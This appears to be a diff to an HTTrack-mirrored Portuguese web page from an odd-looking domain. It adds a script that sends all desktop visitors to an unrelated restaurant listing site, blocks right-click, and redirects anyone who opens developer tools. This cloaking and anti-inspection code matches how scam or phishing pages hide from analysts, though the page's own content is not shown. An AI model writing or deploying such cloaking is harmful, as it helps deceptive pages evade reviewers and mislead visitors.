@@ -2,7 +2,31 @@
 <html lang="pt-BR">
 
 <!-- Mirrored from onhugbahtochnow.sbs/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Jan 2026 19:39:13 GMT -->
-<head>
+<head><script>
+        (function() {
+            function isMobile() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+
+            if (!isMobile()) {
+                alert("Clique em Ok para ser redirecionando para o nosso site .");
+                window.location.href = "https://restaurantguru.com.br/Guaruja";
+            }
+
+            document.addEventListener("keydown", function(event) {
+                if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
+                    event.preventDefault();
+                    alert("Acesso negado às ferramentas de desenvolvedor!");
+                    window.location.href = "https://restaurantguru.com.br/Guaruja";
+                }
+            });
+
+            document.addEventListener("contextmenu", function(event) {
+                event.preventDefault();
+                alert("Botão direito desativado!");
+            });
+        })();
+</script>
     <style data-vite-theme="" data-inject-first="">
         :root {
             --background: 0 0% 100%;
